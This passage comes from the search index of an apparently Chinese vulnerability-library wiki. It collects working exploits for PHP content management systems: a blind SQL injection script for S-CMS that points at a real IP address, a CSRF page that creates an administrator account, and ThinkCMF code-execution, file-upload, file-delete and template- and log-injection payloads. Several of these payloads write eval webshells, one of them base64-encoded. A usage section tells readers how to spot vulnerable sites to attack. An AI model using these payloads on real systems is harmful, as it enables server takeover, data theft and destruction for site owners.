<p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/PHPCMS/PHPCMS_v9.6.2_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/#references","title":"References","text":"<ol> <li>http://www.lybbn.cn/data/datas.php?yw=176</li> <li>https://www.seebug.org/vuldb/ssvid-93121</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"S CMS PHP v3.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 S-CMS PHP v3.0\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e 2019-05-31 zhhhy https://www.s-cms.cn/download.html?code=php https://www.s-cms.cn/download.html?code=php PHP v3.0 CVE-2019-12860"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a/js/scms.php \u7b2c182-204\u884c,\u5728\u7b2c83\u884c\u5904\uff0c\u53d8\u91cf\\(pageid\u63a5\u53d7\u4f7f\u7528POST\u65b9\u5f0f\u4f20\u9012\u7684pageid\u7684\u503c\u3002\u800c\u5728\u7b2c87\u884c\u548c\u7b2c95\u884c\u5904\uff0c\u53d8\u91cf\\)pageid\u88ab\u76f4\u63a5\u62fc\u63a5\u8fdbSQL\u8bed\u53e5\u4e4b\u4e2d\uff0c\u4ece\u800c\u4ea7\u751f\u6ce8\u5165\u3002\u800c\u7531\u4e8e\u662f\u6570\u5b57\u578b\u6ce8\u5165\uff0c\u907f\u514d\u4f7f\u7528\u5355\u5f15\u53f7\u7b49\u7b26\u53f7\u4ee5\u81f3\u4e8e\u7ed5\u8fc7\u4e86\u9632\u5fa1\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%20PHP%20v3.0%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u6784\u9020\u5982\u4e0bpoc.py </p> <pre><code>import requests\nimport urllib.parse\n\nchars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_0123456789'\n\nurl='http://106.14.144.32:2000/js/scms.php'\n\ndef getDatabaseLength():\n    print('\u5f00\u59cb\u7206\u7834\u6570\u636e\u5e93\u957f\u5ea6\u3002\u3002\u3002')\n    for i in range(10):\n        payload=\"1%0Aand%0Aif(length(database())&gt;{},1,0)#\".format(i)\n        payload=urllib.parse.unquote(payload)\n        data = {\n            'action':'jssdk',\n            'pagetype':'text',\n            'pageid':payload\n        }\n        # print(data)\n        # data = urllib.parse.unquote(data)\n        # print(data)\n        rs = requests.post(url=url,data=data)\n        rs.encode='utf-8'\n        # print(rs.text)\n        if \"20151019102732946.jpg\" not in rs.text:\n            print(\"\u6570\u636e\u5e93\u540d\u7684\u957f\u5ea6\u4e3a\uff1a{}\".format(i))\n            return i\n\ndef getDatabaseName():\n    print('\u5f00\u59cb\u83b7\u53d6\u6570\u636e\u5e93\u540d')\n    databasename = ''\n\n    length = getDatabaseLength()\n    # length = 4\n    for i in range(1,length+1):\n        for c in chars:\n            payload='1%0Aand%0Aif(ascii(substr(database(),{},1))={},1,0)#'.format(i,ord(c))\n            # print(payload)\n            payload = urllib.parse.unquote(payload)\n            data = {\n                'action': 'jssdk',\n                'pagetype': 'text',\n                'pageid': payload\n            }\n            rs = requests.post(url=url, data=data)\n            rs.encode = 'utf-8'\n            # print(rs.text)\n            if \"20151019102732946.jpg\" in rs.text:\n                databasename = databasename+c\n                print(databasename)\n\n    return databasename\ngetDatabaseName() \n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/","title":"S CMS\u4f01\u4e1a\u5efa\u7ad9\u7cfb\u7edfPHP\u7248v3.0\u540e\u53f0\u5b58\u5728CSRF\u53ef\u6dfb\u52a0\u7ba1\u7406\u5458\u6743\u9650\u8d26\u53f7","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 S-CMS\u4f01\u4e1a\u5efa\u7ad9\u7cfb\u7edfPHP\u7248v3.0\u540e\u53f0\u5b58\u5728CSRF\u53ef\u6dfb\u52a0\u7ba1\u7406\u5458\u6743\u9650\u8d26\u53f7 2019-02-22 qn\uff08137535957@qq.cn\uff09 https://www.s-cms.cn https://www.s-cms.cn PHP v3.0 CVE-2019-9040"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2ahtml\u9875\u9762\u8bf1\u9a97\u5df2\u767b\u5f55\u7684\u7ba1\u7406\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801\u3002 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/SCMS/S-CMS%E4%BC%81%E4%B8%9A%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9FPHP%E7%89%88v3.0%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8CSRF%E5%8F%AF%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E8%B4%A6%E5%8F%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a </p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://127.0.0.1/1.com.php/admin/ajax.php?type=admin&amp;action=add&amp;lang=0\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;login\" value=\"test1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;pwd\" value=\"test1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;type\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a0\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a1\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a2\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a3\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a4\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a5\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a6\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a8\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a10\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a7\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a9\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;a11\" value=\"1\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;textauth&amp;#91;&amp;#93;\" value=\"all\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;productauth&amp;#91;&amp;#93;\" value=\"all\" /&gt;\n      &lt;input type=\"hidden\" name=\"A&amp;#95;bbsauth&amp;#91;&amp;#93;\" value=\"all\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"CVE 2019 7580 thinkcmf 5.0.190111\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5199\u5165\u5bfc\u81f4\u7684\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#cve-2019-7580-thinkcmf-50190111","title":"CVE-2019-7580 thinkcmf-5.0.190111\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u5199\u5165\u5bfc\u81f4\u7684\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#0x00","title":"0x00 \u73af\u5883\u642d\u5efa","text":"<p>\u9996\u5148\u53bbthinkcmf\u4e0b\u8f7d5.0\u7684\u6700\u65b0\u7248 https://github.com/thinkcmf/thinkcmf/archive/5.0.190111.zip \u5207\u6362\u5230web\u6839\u76ee\u5f55\u4e0b\uff0c\u6bd4\u5982/var/www\uff0c\u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55\uff1aThinkCMF-5.0.190111 \u628a\u9664public\u76ee\u5f55\u5916\u7684\u6587\u4ef6\u90fd\u79fb\u52a8\u5230ThinkCMF-5.0.190111\u4e0b\u3002\u7136\u540e\u4fee\u6539index.php\uff0c\u5c06\u5176\u4e2d\u7684  </p> <pre><code>define('CMF_ROOT', __DIR__ . '/../');\n</code></pre> <p>\u4fee\u6539\u4e3a  </p> <pre><code>define('CMF_ROOT', __DIR__ . '/ThinkCMF-5.0.190111/');\n</code></pre> <p>\u7136\u540e\u4e00\u6b65\u6b65\u5b8c\u6210\u5b89\u88c5\u3002 \u53c2\u8003\uff1ahttps://blog.csdn.net/youaregoo/article/details/82219722 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#0x01","title":"0x01 \u5229\u7528\u8fc7\u7a0b\uff1a","text":"<p>\u540e\u53f0\u767b\u5f55\u72b6\u6001\u4e0b\uff0c 1\u3001\u5c06payload\u63d2\u5165\u6570\u636e\u5e93\u5e76\u8bfb\u53d6\u7136\u540e\u5199\u5165data/conf/route.php\u6587\u4ef6  </p> <pre><code>POST /portal/admin_category/addpost.html\nparent_id=0&amp;name=111&amp;alias=a'=&gt;array(%22%22)%2csleep(5)%2c'b\n</code></pre> <p>2\u3001\u7136\u540e\u8bbf\u95ee\uff1a  </p> <pre><code>/portal/admin_category/index.html\n</code></pre> <p>\u89e6\u53d1  </p> <pre><code>include data/conf/route.php  \n</code></pre> <p>\u64cd\u4f5c\uff0c\u6267\u884cpayload\u3002\u4e0b\u56fe\u4ee5\u6267\u884csleep(5)\u4f5c\u4e3a\u6f14\u793a\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/CVE-2019-7580%20thinkcmf-5.0.190111%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%AF%BC%E8%87%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#poc","title":"POC","text":"<pre><code>POST /portal/admin_category/addpost.html HTTP/1.1\nHost: 192.168.170.209\nContent-Length: 183\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: PHPSESSID=of2ar92rpeucrh4cg6s4t4dae6; admin_username=admin\nConnection: close\n\nparent_id=0&amp;name=111&amp;alias=1'%3D%3Earray(%22%22)%2Cphpinfo()%2C'2\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/","title":"ThinkCMF\u6f0f\u6d1e\u5168\u96c6\u548c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#thinkcmf","title":"ThinkCMF\u6f0f\u6d1e\u5168\u96c6\u548c","text":"<p>...\u6301\u7eed\u6536\u96c6,\u6b22\u8fce\u8d21\u732e  </p> <ul> <li>\u524d\u53f0SQL\u6ce8\u5165:   <p>\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c paylaod:  </p> </li> </ul> <pre><code>POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post HTTP/1.1\nHost: localhost\nConnection: close\nCookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 79\n\npost[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-\n</code></pre> <p>\u8fd8\u6709\u4ee5\u4e0b\u53ef\u4ee5\u6d4b\u8bd5\uff1a <pre><code>post:\nterm:123\npost[post_title]:123\npost[post_title]:aaa\npost_title:123\npost[id][0]:bind\n</code></pre></p> <ul> <li>\u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e-\u53efgetshell\u56db\u5904  </li> </ul> <pre><code># \u4ec5\u5728Windows\u73af\u5883\u6d4b\u8bd5\n# \u7b2c\u4e00\u5904  \nhttp://website/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch&amp;templateFile=/../public/index&amp;content=&lt;%3fphp+file_put_contents('m.php','&lt;%3fphp+eval($_POST[_])%3b');?&gt;&amp;prefix=\n# \u7b2c\u4e8c\u5904  \nhttp://website/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch&amp;templateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents('m.php','&lt;%3fphp+eval($_POST[_])%3b');?&gt;&amp;prefix=\n\n# \u7b2c\u4e09\u5904  \n/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content=&lt;php&gt;file_put_contents('test.php','&lt;?php phpinfo(); ?&gt;')&lt;/php&gt;\n\n# \u7b2c\u56db\u5904\n/index.php?a=fetch&amp;content=&lt;?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==\"));\n</code></pre> <ul> <li> <p>\u4efb\u610f\u6587\u4ef6\u5220\u9664-\u53ea\u80fdwindows\u5220\u9664  </p> <p>\u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 <pre><code>POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar&amp; HTTP/1.1\nHost: localhost\nCookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 27\n\nimgurl=..\\..\\..\\test.txt\n</code></pre></p> </li> <li> <p>\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20  </p> <p>\u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 <code>curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' 'http://127.0.0.1/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile'</code></p> </li> <li> <p>\u4efb\u610f\u6587\u4ef6\u5305\u542b\uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 <code>/index.php?a=display&amp;templateFile=README.md</code></p> </li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E6%BC%8F%E6%B4%9E%E5%85%A8%E9%9B%86%E5%92%8C/#_1","title":"\u4f7f\u7528\u8bf4\u660e","text":"<p>thinkcmf \u5e76\u6ca1\u6709\u6b7b\uff0c\u5e76\u4e14\u67093\u7248\u672c\u4e0e5\u7248\u672c\u8fd9\u91cc\u63d0\u4f9b\u4e00\u4e9b\u65b9\u6cd5\uff0c\u5e2e\u52a9\u4f60\u4eec\u8fa8\u522b\u54ea\u4e00\u4e9b\u662f\u53ef\u4ee5\u65e5\u7684\uff0c\u90a3\u4e00\u4e9b\u4e8b\u4e0d\u884c\u7684\u3002 1.\u770blogo 3\u7684logo\u662f\u9ec4\u8272\u7684. 2.\u5728\u7f51\u7ad9url \u540e\u9762\u8f93\u5165 admin,\u5982\u679c\u9875\u9762\u662f\u84dd\u8272\u7684\u8868\u793a\u662f3\u7684\uff0c\u53ef\u65e5\u7a7f\u4e4b. 3.\u67e5\u770b README.md \u5728\u7f51\u7ad9url\u540e\u9762\u8f93\u5165README.md. \u53e6\u5916\u8fd8\u6709\u4e00\u4e2a\u8bf4\u660e\uff0c\u4f60\u5728\u5b9e\u9645\u64cd\u4f5c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4ed6\u4e00\u76f4\u62a5\u8fd9\u4e2a<code>\u6a21\u677f\u4e0d\u5b58\u5728</code>\u9519: <pre><code>url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch\npost:\ntemplateFile=/../public/index\nprefix=''\ncontent=&lt;php&gt;file_put_contents('test.php','&lt;?php eval($_REQUEST[11]);')&lt;/php&gt;\n</code></pre> \u8bf7\u653e\u5fc3\u8fd9\u5e76\u4e0d\u662f\u8bf4\u660e\u6f0f\u6d1e\u4e0d\u53ef\u4f7f\u7528\uff0c\u800c\u662f\u8bf4\uff0c\u8fd9\u4e2a\u6a21\u7248\u4e0d\u5b58\u5728\uff0c\u4f60\u53ef\u4ee5\u6362\u4e00\u4e2ahtml\u5373\u53ef <pre><code>\u4f8b\u5982\uff1a\n/../public/index\n/../public/exception\n/../data/index\n/../data/runtime/index\n/../plugins/Mobileverify/View/admin_index\n/../plugins/Mobileverify/View/index\n/../plugins/Mobileverify/View/widget\n/../plugins/Demo/View/admin_index\n/../plugins/Demo/View/index\n/../plugins/Demo/View/widget\n/../application/Install/View/Public/footer\n/../application/Install/View/Public/head\n/../application/Install/View/Public/header\n/../application/Common/index\n/../application/Portal/Lang/en-us/index\n/../application/Api/Lang/en-us/index\n/../application/Api/Lang/zh-cn/index\n/../application/Comment/Lang/en-us/index\n/../application/Comment/Lang/zh-cn/index\n</code></pre></p> <p><pre><code>url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch\npost:\ntemplateFile=/../../../public/index\nprefix=''\ncontent=&lt;php&gt;file_put_contents('test1.php','&lt;?php eval($_REQUEST[11]);')&lt;/php&gt;\n</code></pre> <pre><code>/../../../public/index\n/../../../public/exception\n/../../../data/index\n/../../../data/runtime/index\n/../../../plugins/Mobileverify/View/admin_index\n/../../../plugins/Mobileverify/View/index\n/../../../plugins/Mobileverify/View/widget\n/../../../plugins/Demo/View/admin_index\n/../../../plugins/Demo/View/index\n/../../../plugins/Demo/View/widget\n/../../../application/Install/View/Public/footer\n/../../../application/Install/View/Public/head\n/../../../application/Install/View/Public/header\n/../../../application/Common/index\n/../../../application/Portal/Lang/en-us/index\n/../../../application/Api/Lang/en-us/index\n/../../../application/Api/Lang/zh-cn/index\n/../../../application/Comment/Lang/en-us/index\n/../../../application/Comment/Lang/zh-cn/index\n</code></pre></p> <p>\u8fd8\u6709\u6700\u540e\u4e00\u53e5\u5e9f\u8bdd\uff1a\u6a21\u7248\u6ce8\u5165\u5bf9\u4e8elinux \u5e76\u4e0d\u597d\u7528 : )  </p> <p>\u53c2\u8003\uff1a https://xz.aliyun.com/t/3409 https://xz.aliyun.com/t/3529 https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/","title":"ThinkCMF\u7f13\u5b58Getshell\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<p>ThinkCMF X1.6.0</p> <p>ThinkCMF X2.1.0</p> <p>ThinkCMF X2.2.0 </p> <p>ThinkCMF X2.2.1 </p> <p>ThinkCMF X2.2.2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkCMS/ThinkCMF%E7%BC%93%E5%AD%98Getshell%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u5e38\u89c4\u64cd\u4f5c</p> <pre><code>http://wiki.bylibrary.cn/index.php?a=display&amp;templateFile=README.md&amp;content=%3C?php%20phpinfo();die();\n</code></pre> <p></p> <p>\u5229\u7528\u7f13\u5b58\u6587\u4ef6getshell</p> <p>\u7531\u4e8ethinkcmf2.x\u4f7f\u7528\u4e86thinkphp3.x\u4f5c\u4e3a\u5f00\u53d1\u6846\u67b6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u542f\u7528\u4e86\u62a5\u9519\u65e5\u5fd7\u5e76\u4e14\u5f00\u542f\u4e86\u6a21\u677f\u7f13\u5b58\uff0c\u5bfc\u81f4\u53ef\u4ee5\u4f7f\u7528\u52a0\u8f7d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6a21\u677f\u6765\u5c06\u751f\u6210\u4e00\u53e5\u8bdd\u7684PHP\u4ee3\u7801\u5199\u5165data/runtime/Logs/Portal\u76ee\u5f55\u4e0b\u7684\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u518d\u6b21\u5305\u542b\u8be5\u65e5\u5fd7\u6587\u4ef6\u5373\u53ef\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u4e0b\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cm.php</p> <p>\u65e5\u5fd7\u6587\u4ef6\u683c\u5f0f\u4e3aYY_MM_DD.log\uff0c\u5982\u5f53\u524d\u65e5\u671f\u4e3a2019\u5e7412\u670812\u65e5\uff0c\u65e5\u5fd7\u6587\u4ef6\u4e3a19_12_12.log\uff0c\u5b8c\u6574\u8def\u5f84\u4e3a</p> <pre><code>data/runtime/Logs/Portal/19_12_12.log\n</code></pre> <p>payload \u4e00</p> <p>\u9996\u5148\u8bbf\u95ee</p> <pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=%3C?php%20file_put_contents(%27m.php%27,%27%3C%3fphp+eval($_POST[%22X%22])%3b%3F%3E%27);die();?%3E\n</code></pre> <p>\u7136\u540e\u8bf7\u6c42</p> <pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log\n</code></pre> <p>\u5373\u53ef\u5728http://www.0-sec.org/\u6839\u76ee\u5f55\u751f\u6210m.php\uff0c\u5bc6\u7801\u662fX</p> <p>payload \u4e8c</p> <p>\u9996\u5148\u8bbf\u95ee</p> <pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=%3C%3F%70%68%70%20%65%76%61%6C%28%24%5F%50%4F%53%54%5BX%5D%29%3B%3F%3E\n</code></pre> <p>\u7136\u540e\u83dc\u5200\u94fe\u63a5\uff08\u5bc6\u7801\u4e5f\u662fx\uff09</p> <pre><code>http://wiki.bylibrary.cn/?a=display&amp;templateFile=data/runtime/Logs/Portal/YY_MM_DD.log\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/","title":"ThinkSNS_V4 \u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u5bfc\u81f4Getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/ThinkSNS/ThinkSNS_V4/#affected-version","title":"Affected Version","text":"<pre><code>ThinkSNS\u5b98\u7f51\uff1ahttp://www.thinksns.com\n\n\u7f51\u7ad9\u6e90\u7801\u7248\u672c\uff1aThinkSNS V4  